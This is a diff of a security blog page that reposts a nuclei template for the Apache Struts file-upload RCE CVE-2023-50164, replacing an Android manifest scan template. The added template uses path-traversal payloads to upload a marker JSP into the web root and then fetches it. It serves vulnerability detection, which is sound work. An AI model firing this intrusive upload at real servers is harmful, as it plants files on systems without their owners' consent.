@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： AndroidManifest.xml minSdkVersion&#x3D;21 Check (Local File Scan) 漏洞类型： 配置问题 漏洞等级： 低危 漏洞描述： 扫描AndroidManifest.xml文件以检测minSdkVersion是否设置为21（Android 5.0），这可能会使应用在未打补丁的Android 5.0-5.0.2设备上暴露于漏洞">
+    <meta name="description" content="漏洞信息漏洞名称： Apache Struts 任意文件上传远程代码执行漏洞 漏洞编号：  CVE： CVE-2023-50164  漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： Apache Struts版本存在远程代码执行漏洞（CVE-2023-50164），通过文件上传功能中的路径遍历，允许将任意文件上传到web根目录。 产品厂商： Apache 产品名称： Apache Struts">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AndroidManifest.xml minSdkVersion&#x3D;21 Check (Local File Scan)">
-<meta property="og:url" content="http://example.com/2025/06/11/github_3129351549/index.html">
+<meta property="og:title" content="Apache Struts 任意文件上传远程代码执行漏洞">
+<meta property="og:url" content="http://example.com/2025/06/11/github_3836685325/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： AndroidManifest.xml minSdkVersion&#x3D;21 Check (Local File Scan) 漏洞类型： 配置问题 漏洞等级： 低危 漏洞描述： 扫描AndroidManifest.xml文件以检测minSdkVersion是否设置为21（Android 5.0），这可能会使应用在未打补丁的Android 5.0-5.0.2设备上暴露于漏洞">
+<meta property="og:description" content="漏洞信息漏洞名称： Apache Struts 任意文件上传远程代码执行漏洞 漏洞编号：  CVE： CVE-2023-50164  漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： Apache Struts版本存在远程代码执行漏洞（CVE-2023-50164），通过文件上传功能中的路径遍历，允许将任意文件上传到web根目录。 产品厂商： Apache 产品名称： Apache Struts">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-11T18:46:05.279Z">
-<meta property="article:modified_time" content="2025-06-11T18:46:05.279Z">
+<meta property="article:published_time" content="2025-06-11T19:15:28.308Z">
+<meta property="article:modified_time" content="2025-06-11T19:15:28.307Z">
 <meta property="article:author" content="lianccc">
 <meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
-<meta property="article:tag" content="配置问题">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>AndroidManifest.xml minSdkVersion=21 Check (Local File Scan) - liancc&#39; infos blog</title>
+  <title>Apache Struts 任意文件上传远程代码执行漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="AndroidManifest.xml minSdkVersion=21 Check (Local File Scan)"></span>
+            <span id="subtitle" data-typed-text="Apache Struts 任意文件上传远程代码执行漏洞"></span>
           
         </div>
 
@@ -213,7 +213,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-11 18:46" pubdate>
+        <time datetime="2025-06-11 19:15" pubdate>
           2025年6月11日 晚上
         </time>
       </span>
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          145 字
+          337 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          2 分钟
+          3 分钟
         
       </span>
     
@@ -273,19 +273,24 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">AndroidManifest.xml minSdkVersion=21 Check (Local File Scan)</h1>
+            <h1 id="seo-header">Apache Struts 任意文件上传远程代码执行漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> AndroidManifest.xml minSdkVersion&#x3D;21 Check (Local File Scan)</p>
-<p><strong>漏洞类型：</strong> 配置问题</p>
-<p><strong>漏洞等级：</strong> 低危</p>
-<p><strong>漏洞描述：</strong> 扫描AndroidManifest.xml文件以检测minSdkVersion是否设置为21（Android 5.0），这可能会使应用在未打补丁的Android 5.0-5.0.2设备上暴露于漏洞。</p>
-<p><strong>产品名称：</strong> Android</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/79ba19a66fdba6276dc67595b419190fd85ef702/file%2Fandroid%2Fandroid-minsdk-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/79ba19a66fdba6276dc67595b419190fd85ef702/file%2Fandroid%2Fandroid-minsdk-check.yaml</a></p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Struts 任意文件上传远程代码执行漏洞</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2023-50164</li>
+</ul>
+<p><strong>漏洞类型：</strong> 文件上传</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> Apache Struts版本存在远程代码执行漏洞（CVE-2023-50164），通过文件上传功能中的路径遍历，允许将任意文件上传到web根目录。</p>
+<p><strong>产品厂商：</strong> Apache</p>
+<p><strong>产品名称：</strong> Apache Struts</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/6963f2b449c4af99769272497a9a562722eadebc/cves%2F2023%2Fcve-2023-50164.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/6963f2b449c4af99769272497a9a562722eadebc/cves%2F2023%2Fcve-2023-50164.yaml</a></p>
 <p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
-<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> android-minsdk-check<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> AndroidManifest.xml minSdkVersion<span class="hljs-operator">=</span><span class="hljs-number">21</span> Check (Local File Scan)<br>  <span class="hljs-params">author:</span> Th3l0newolf<br>  <span class="hljs-params">severity:</span> Low<br>  <span class="hljs-params">description:</span> |<br>    Scans AndroidManifest.xml files to detect <span class="hljs-keyword">if</span> minSdkVersion is set<br>    to <span class="hljs-number">21</span> (Android <span class="hljs-number">5.0</span>), which may expose the app to vulnerabilities <br>    on unpatched Android <span class="hljs-number">5</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">5.0</span>.<span class="hljs-number">2</span> devices.<br>  <span class="hljs-params">tags:</span> android,manifest,xml,security,file<br><br><span class="hljs-params">file:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">extensions:</span><br>      <span class="hljs-operator">-</span> xml<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;android:minSdkVersion<span class="hljs-char escape_">\\</span>s*=<span class="hljs-char escape_">\\</span>s*[&#x27;<span class="hljs-char escape_">\&quot;</span>]21[&#x27;<span class="hljs-char escape_">\&quot;</span>]&quot;</span><br><br><br></code></pre></td></tr></table></figure>
+<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> struts-file-upload-rce<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Apache Struts <span class="hljs-operator">-</span> Arbitrary File Upload RCE<br>  <span class="hljs-params">author:</span> <span class="hljs-number">00</span>xmora<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Apache Struts versions are vulnerable to a remote code execution vulnerability (CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">50164</span>)<br>    via a path traversal <span class="hljs-keyword">in</span> the file upload functionality, allowing arbitrary file upload to the web root.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2023-50164</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/NikitaPark/CVE-2023-50164-PoC</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">50164</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">22</span><br>  <span class="hljs-params">tags:</span> cve,cve2023,struts,rce,fileupload,traversal,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">endpoint:</span> <span class="hljs-string">&quot;StrutsUploadApp/upload.action&quot;</span><br>  <span class="hljs-params">shellname:</span> <span class="hljs-string">&quot;shell_&#123;&#123;randstr&#125;&#125;.jsp&quot;</span><br>  <span class="hljs-params">shellcontent:</span> <span class="hljs-string">&quot;&lt;% out.println(<span class="hljs-char escape_">\&quot;</span>NUCLEI-RCE-&#123;&#123;randstr&#125;&#125;<span class="hljs-char escape_">\&quot;</span>); %&gt;&quot;</span><br><br><span class="hljs-params">requests:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>&#123;&#123;endpoint&#125;&#125; HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64)<br>        <span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-operator">-</span>---WebKitFormBoundaryKQeAnc4Qm964UwhY<br>        <span class="hljs-params">Accept-Encoding:</span> gzip<br><br>        <span class="hljs-operator">-</span>-----WebKitFormBoundaryKQeAnc4Qm964UwhY<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Upload&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&#123;shellname&#125;&#125;&quot;</span><br>        <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span><br><br>        &#123;&#123;shellcontent&#125;&#125;<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundaryKQeAnc4Qm964UwhY<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploadFileName&quot;</span><br><br>        &#123;&#123;traversal&#125;&#125;webapps<span class="hljs-operator">/</span>ROOT<span class="hljs-operator">/</span>&#123;&#123;shellname&#125;&#125;<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundaryKQeAnc4Qm964UwhY--<br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">traversal:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;../&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;../../&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;../../../&quot;</span><br>    <span class="hljs-params">attack:</span> clusterbomb<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;text/html&quot;</span><br>        <span class="hljs-params">part:</span> header<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/&#123;&#123;shellname&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;NUCLEI-RCE-&#123;&#123;randstr&#125;&#125;&quot;</span><br>        <span class="hljs-params">part:</span> body<br><br><br></code></pre></td></tr></table></figure>
 
 
                 
@@ -322,7 +327,7 @@
       
         <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
       
-        <a href="/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" class="print-no-link">#配置问题</a>
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
       
     </div>
   
@@ -334,8 +339,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>AndroidManifest.xml minSdkVersion=21 Check (Local File Scan)</div>
-      <div>http://example.com/2025/06/11/github_3129351549/</div>
+      <div>Apache Struts 任意文件上传远程代码执行漏洞</div>
+      <div>http://example.com/2025/06/11/github_3836685325/</div>
     </div>
     <div class="license-meta">
       
@@ -379,18 +384,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/11/github_4241703152/" title="Apache Struts 路径遍历与远程代码执行漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Apache Struts 路径遍历与远程代码执行漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/11/github_3725060813/" title="AndroidManifest.xml minSdkVersion=21 Check (Local File Scan)">
-                        <span class="hidden-mobile">AndroidManifest.xml minSdkVersion=21 Check (Local File Scan)</span>
+                      <a href="/2025/06/11/github_4241703152/" title="Apache Struts 路径遍历与远程代码执行漏洞">
+                        <span class="hidden-mobile">Apache Struts 路径遍历与远程代码执行漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
